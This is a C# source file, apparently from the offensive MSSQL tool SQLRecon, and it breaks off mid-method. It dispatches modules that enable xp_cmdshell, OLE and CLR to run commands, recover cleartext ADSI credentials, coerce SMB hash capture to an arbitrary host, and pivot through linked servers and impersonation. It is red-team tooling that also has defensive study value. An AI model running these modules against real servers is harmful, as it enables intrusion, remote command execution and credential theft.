using System;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using SQLRecon.Modules;
using SQLRecon.Utilities;

namespace SQLRecon.Commands
{
    internal class ModuleHandler
    {
        private static GlobalVariables _gV = new();
        private static readonly ADSI _adsi = new();
        private static readonly AgentJobs _agentJobs = new();
        private static readonly CLR _clr = new();
        private static readonly Configure _config = new();
        private static readonly OLE _ole = new();
        private static readonly PrintUtils _print = new();
        private static readonly Roles _roles = new();
        private static readonly Sccm _sccm = new();
        private static readonly SqlQuery _sqlQuery = new();
        private static readonly XpCmdShell _xpCmdShell = new();

        private static SqlConnection _connection = _gV.Connect;
        private static string _arg0 = _gV.Arg0;
        private static string _arg1 = _gV.Arg1;
        private static string _arg2 = _gV.Arg2;
        private static string _database = _gV.Database;
        private static string _impersonate = _gV.Impersonate;
        private static string _linkedSqlServer = _gV.LinkedSqlServer;
        private static string _module = _gV.Module;
        private static string _query;
        private static string _sqlServer = _gV.SqlServer;

        /// <summary>
        /// The ExecuteModule method will match the user supplied module in the
        /// _module variable against a method name and use reflection to execute
        /// the method in the local class.
        /// </summary>
        public static void ExecuteModule()
        {
            // First check to see if there is a SQL connection object.
            if (_connection == null)
            {
                // Go no futher.
                return;
            }

            // Reference: https://stackoverflow.com/questions/29034093/create-instance-of-class-and-call-method-from-string/29034215
            // Set the type name to this local class.
            Type type = Type.GetType(MethodBase.GetCurrentMethod().DeclaringType.ToString());

            if (type != null)
            {
                // Match the method name to the module that has been supplied as an argument.
                MethodInfo method = type.GetMethod(_module);

                if (method != null)
                {
                    // Call the method.
                    method.Invoke(null, null);
                }
                else
                {
                    _print.Error("Invalid module.", true);
                    // Go no futher.
                    return;
                }
            }
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ****************** Standard SQL Server Modules ******************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The adsi method is used against single instances of SQL server to
        /// obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void adsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {0}", _sqlServer, _arg1), true);
            _adsi.Standard(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The agentcmd method is used against single instances of SQL server to
        /// execute commands via agent jobs.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void agentcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _agentJobs.Standard(_connection, _sqlServer, _arg1);
        }

        /// <summary>
        /// The agentstatus method is used against single instances of SQL server to
        /// check to see if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void agentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0}", _sqlServer), true);
            _agentJobs.GetAgentStatusAndJobs(_connection, _sqlServer);
        }

        /// <summary>
        /// The checkrpc method is used against the initial SQL server to
        /// identify what systems can have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void checkrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC configured via {0}", _sqlServer), true);
            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The clr method is used against single instances of SQL server to
        /// execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void clr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack on {0}", _sqlServer), true);
            _clr.Standard(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The columns method is used against single instances of SQL server to
        /// list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.       
        /// </summary>
        public static void columns()
        {
            _print.Status(string.Format("Displaying columns from table '{1}' in '{0}' on {2}",
                _arg1, _arg2, _sqlServer), true);
                
            _query = "use " + _arg1 + ";" +
                "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                "WHERE TABLE_NAME = '" + _arg2 + "' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The databases method is used against single instances of SQL server to
        /// show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void databases()
        {
            _print.Status(string.Format("Databases on {0}", _sqlServer), true);
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(_connection, _query));
        }

        /// <summary>
        /// The disableclr method is used against single instances of SQL server to
        /// disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disableclr()
        {
            _print.Status(string.Format("Disabling CLR integration on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "0", _sqlServer);
        }

        /// <summary>
        /// The disableole method is used against single instances of SQL server to
        /// disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disableole()
        {
            _print.Status(string.Format("Disabling Ole Automation Procedures on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "0", _sqlServer);
        }

        /// <summary>
        /// The disablerpc method is used against the initial SQL server to
        /// disable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disablerpc()
        {
            _print.Status(string.Format("Disabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "false", _arg1);
        }

        /// <summary>
        /// The disablexp method is used against single instances of SQL server to
        /// disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "0", _sqlServer);
        }

        /// <summary>
        /// The enableclr method is used against single instances of SQL server to
        /// enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enableclr()
        {
            _print.Status(string.Format("Enabling CLR integration on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "1", _sqlServer);
        }

        /// <summary>
        /// The enableole method is used against single instances of SQL server to
        /// enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enableole()
        {
            _print.Status(string.Format("Enabling Ole Automation Procedures on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "1", _sqlServer);
        }

        /// <summary>
        /// The enablerpc method is used against the initial SQL server to
        /// enable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enablerpc()
        {
            _print.Status(string.Format("Enabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1);
        }

        /// <summary>
        /// The enablexp method is used against single instances of SQL server to
        /// enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "1", _sqlServer);
        }

        /// <summary>
        /// The impersonate method is used against single instances of SQL server to
        /// identify if any SQL accounts can be impersonated.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void impersonate()
        {
            _print.Status(string.Format("Enumerating accounts that can be impersonated on {0}", _sqlServer), true);

            _query = _sqlQuery.ExecuteCustomQuery(_connection,
                "SELECT distinct b.name FROM sys.server_permissions a " +
                "INNER JOIN sys.server_principals b ON a.grantor_principal_id " +
                "= b.principal_id WHERE a.permission_name = 'IMPERSONATE';");

            Console.WriteLine(_query.Contains("name")
                ? _query
                : _print.Status("No logins can be impersonated."));
        }
        /// <summary>
        /// The info method is used against single instances of SQL server to
        /// gather information about the remote SQL server instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void info()
        {
            _print.Status(string.Format("Extracting SQL Server information from {0}", _sqlServer), true);
            var Info = new SqlServerInfo(_connection);
            Info.GetAllSQLServerInfo();
            Info.PrintInfo();
        }

        /// <summary>
        /// The links method is used against single instances of SQL server to
        /// determine if the remote SQL server has a link configured to other SQL servers.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void links()
        {
            _print.Status(string.Format("Additional SQL links on {0}", _sqlServer), true);
            _query = "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The olecmd method is used against single instances of SQL server to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void olecmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _ole.Standard(_connection, _arg1);
        }

        /// <summary>
        /// The query method is used against single instances of SQL server to
        /// execute a user supplied SQL query.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void query()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _arg1), true);
        }

        /// <summary>
        /// The rows method is used against single instances of SQL server to
        /// determine the number of ` in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name. 
        /// </summary>
        public static void rows()
        {
            _print.Status(string.Format("Displaying number of rows from table '{1}' in '{0}' on {2}",
                _arg1, _arg2, _sqlServer), true);

            _query = "use " + _arg1 + ";" + 
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The search method is used against single instances of SQL server to
        /// search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void search()
        {
            _print.Status(string.Format("Searching for columns containing '{0}' in '{1}' on {2}", 
                _arg1, _database, _sqlServer), true);

            _query = "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%" + _arg1 + "%';";

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The smb method is used against single instances of SQL server to
        /// make the SQL server solicit a SMB request to an arbitrary host.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void smb()
        {
            CaptureHash _ = new(_connection, _arg1);
            _print.Status(string.Format("Sent SMB Request to {0}", _arg1), true);
        }

        /// <summary>
        /// The tables method is used against single instances of SQL server to
        /// retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void tables()
        {
            _print.Status(string.Format("Tables in {0}", _arg1), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The users method is used against single instances of SQL server to
        /// obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void users()
        {
            _print.Status(string.Format("Users in the '{0}' database on {1}", _database, _sqlServer), true);
            
            _query = "SELECT name AS username, create_date, " +
                    "modify_date, type_desc AS type, authentication_type_desc AS " +
                    "authentication_type FROM sys.database_principals WHERE type NOT " +
                    "IN ('A', 'R', 'X') AND sid IS NOT null ORDER BY username;";
            
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(_connection, _query));
        }

        /// <summary>
        /// The whoami method is used against single instances of SQL server to
        /// determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void whoami()
        {
            _print.Status(string.Format("Determining user permissions on {0}", _sqlServer), true);

            _query = "SELECT SYSTEM_USER;";
            _print.Status(string.Format("Logged in as {0}",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            _query = "SELECT USER_NAME();";
            _print.Status(string.Format("Mapped to the user {0}",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            _print.Status("Roles:", true);

            // This SQL command can be run by low privilege users and extracts all
            // of the observable roles which are present in the current database
            // "select name from sys.database_principals where type = 'R'" also works.
            _query = "SELECT [name] FROM sysusers WHERE issqlrole = 1;";
            string getRoles = _sqlQuery.ExecuteCustomQuery(_connection, _query);

            // Get rid of the first two elements, which will be "name" and "-------".
            string[] rolesArr = getRoles.TrimStart('\n').Replace(" |", "").Split('\n').Skip(2).ToArray();

            // These are the default MS SQL database roles.
            string[] defaultRoles = { "sysadmin", "setupadmin", "serveradmin", "securityadmin",
                    "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            string[] combinedRoles = rolesArr.Concat(defaultRoles).ToArray();

            // Test to see if the current principal is a member of any roles.
            foreach (var item in combinedRoles)
            {
                _roles.CheckServerRole(_connection, item.Trim(), true);
            }
        }

        /// <summary>
        /// The xpcmd method is used against single instances of SQL server to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void xpcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _xpCmdShell.Standard(_connection, _arg1);
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ******************* Linked SQL Server Modules *******************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The ladsi method is used against linked SQL servers to
        /// obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ladsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {2} via {1}", 
                _sqlServer, _arg1, _linkedSqlServer), true);
            _adsi.Linked(_connection, _arg1, _arg2, _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lagentcmd method is used against linked SQL servers to
        /// execute commands via agent jobs using PowerShell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lagentcmd()
        {
            _print.Status(string.Format("Executing '{0}' using PowerShell on {1} via {2}", 
                _arg1, _linkedSqlServer, _sqlServer), true);
            _agentJobs.Linked(_connection, _linkedSqlServer, "PowerShell", _arg1, _sqlServer);
        }

        /// <summary>
        /// The lagentstatus method is used against linked SQL servers to
        /// check to see if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lagentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _agentJobs.GetLinkedAgentStatusAndJobs(_connection, _linkedSqlServer);
        }

        /// <summary>
        /// The lcheckrpc method is used against linked SQL servers to
        /// to identify what systems linked off the linked SQL server can have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lcheckrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC configured on {0} via {1}"
                , _linkedSqlServer, _sqlServer), true);

            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lcolumns method is used against linked SQL servers to
        /// to list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.       
        /// </summary>
        public static void lcolumns()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                   _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Displaying columns from '{1}' in '{0}' on {2} via {3}", 
                _arg1, _arg2, _linkedSqlServer, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
               "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
               "WHERE TABLE_NAME = ''" + _arg2 + "'' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lclr method is used against linked SQL servers to execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lclr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _clr.Linked(_connection, _arg1, _arg2, _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldatabases method is used against linked SQL servers to
        /// show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldatabases()
        {
            _print.Status(string.Format("Databases on {0} via {1}", _linkedSqlServer, _sqlServer), true);
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
            Console.WriteLine(_sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, _query));
        }

        /// <summary>
        /// The ldisableclr method is used against linked SQL servers to
        /// disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisableclr()
        {
            _print.Status(string.Format("Disabling CLR integration on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "clr enabled", "0", _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldisableole method is used against linked SQL servers to
        /// disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisableole()
        {
            _print.Status(string.Format("Disabling OLE Automation Procedures on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "OLE Automation Procedures", "0", 
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldisablexp method is used against linked SQL servers to
        /// disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "xp_cmdshell", "0",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenableclr method is used against linked SQL servers to
        /// enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenableclr()
        {
            _print.Status(string.Format("Enabling CLR integration on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "clr enabled", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenableole method is used against linked SQL servers to
        /// enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenableole()
        {
            _print.Status(string.Format("Enabling OLE Automation Procedures on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "OLE Automation Procedures", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenablexp method is used against linked SQL servers to
        /// enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "xp_cmdshell", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The llinks method is used against linked instances of SQL server to
        /// determine if the remote linked SQL server has a link configured to other SQL servers.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void llinks()
        {
            _print.Status(string.Format("Additional SQL links on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _query = "SELECT name, product, provider, data_source FROM " +
                "sys.servers WHERE is_linked = 1;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lolecmd method is used against linked SQL servers to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lolecmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _ole.Linked(_connection, _arg1, _linkedSqlServer);
        }

        /// <summary>
        /// The lquery method is used against linked SQL servers to
        /// execute a user supplied SQL command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lquery()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _arg1), true);
        }

        /// <summary>
        /// The lrows method is used against linked SQL servers to
        /// determine the number of rows in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name. 
        /// </summary>
        public static void lrows()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc /rhost:{1}).",
                   _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Displaying number of rows from '{1}' in '{0}' on {2} via {3}",
                _arg1, _arg2, _linkedSqlServer, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lsearch method is used against linked SQL servers to
        /// search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lsearch()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                    _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Searching for columns containing '{0}' on {1} in '{2}' via {3}",
                _arg2, _linkedSqlServer, _arg1, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE ''%" + _arg2 + "%'';";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lsmb method is used against linked SQL servers to
        /// make the linked SQL server solicit a SMB request to an arbitrary host.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lsmb()
        {
            CaptureHash _ = new(_connection, _arg1, _linkedSqlServer);
            _print.Status(string.Format("SMB Request from {0} to {1} via {2}.",
                _linkedSqlServer, _arg1, _sqlServer), true);
        }

        /// <summary>
        /// The ltables method is used against linked SQL servers to
        /// retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ltables()
        {
            _print.Status(string.Format("Tables in database '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lusers method is used against linked SQL servers to
        /// obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lusers()
        {
            _print.Status(string.Format("Users in the '{0}' database on {1} via {2}",
                _database, _linkedSqlServer, _sqlServer), true);

            _query = "SELECT name AS username, create_date, modify_date, type_desc " +
                "AS type, authentication_type_desc AS authentication_type FROM sys.database_principals " +
                "WHERE type NOT IN (''A'', ''R'', ''X'') AND sid IS NOT null ORDER BY username;";

            Console.WriteLine(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query));
        }

        /// <summary>
        /// The lwhoami method is used against linked SQL servers to
        /// determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lwhoami()
        {
            _print.Status(string.Format("Determining user permissions on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);

            _query = "SELECT SYSTEM_USER;";
            _print.Status(string.Format("Logged in as {0}", _sqlQuery.ExecuteLinkedQuery(
                _connection, _linkedSqlServer, _query)), true);

            _query = "SELECT USER_NAME();";
            _print.Status(string.Format("Mapped to the user {0}", _sqlQuery.ExecuteLinkedQuery(
                _connection, _linkedSqlServer, _query)), true);

            _print.Status("Roles:", true);

            // This SQL command can be run by low privilege users and extracts all of
            // the observable roles which are present in the current database
            // "select name from sys.database_principals where type = 'R'" also works.
            _query = "SELECT [name] FROM sysusers WHERE issqlrole = 1;";
            string GetRoles = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, _query);

            // Get rid of the first two elements, which will be "name" and "-------".
            string[] RolesArr = GetRoles.TrimStart('\n').Replace(" |", "").Split('\n').Skip(2).ToArray();

            // These are the default MS SQL database roles.
            string[] DefaultRoles = { "sysadmin", "setupadmin", "serveradmin",
                    "securityadmin", "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            string[] CombinedRoles = RolesArr.Concat(DefaultRoles).ToArray();

            // Test to see if the current principal is a member of any roles
            foreach (var Item in CombinedRoles)
            {
                _roles.CheckLinkedServerRole(_connection, Item.Trim(), _linkedSqlServer, true);
            }
        }

        /// <summary>
        /// The lxpcmd method is used against linked SQL servers to
        ///  execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lxpcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}.",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _xpCmdShell.Linked(_connection, _arg1, _linkedSqlServer);
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * *************** Impersonation SQL Server Modules ****************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The iadsi method is used in conjunction with an account that can be
        /// impersonated to obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iadsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {0} as '{2}'",
                _sqlServer, _arg1, _impersonate), true);
            _adsi.Impersonate(_connection, _arg1, _arg2, _impersonate);
        }

        /// <summary>
        /// The iagentcmd method is used in conjunction with an account that can be
        /// impersonated to execute commands via agent jobs.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iagentcmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _agentJobs.Impersonate(_connection, _sqlServer, _arg1, _impersonate);
        }

        /// <summary>
        /// The iagentstatus method is used in conjunction with an account that can be
        /// impersonated to check if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iagentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0} as '{1}'",
                _sqlServer, _impersonate), true);
            _agentJobs.GetAgentStatusAndJobs(_connection, _sqlServer, _impersonate);
        }

        /// <summary>
        /// The icheckrpc method is used in conjunction with an account that can be
        /// impersonated against the initial SQL server to identify what systems can
        /// have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void icheckrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC " +
                "configured via {0} as '{1}'", _sqlServer, _impersonate), true);
            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The icolumns method is used in conjunction with an account that can be
        /// impersonated to list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.       
        /// </summary>
        public static void icolumns()
        {
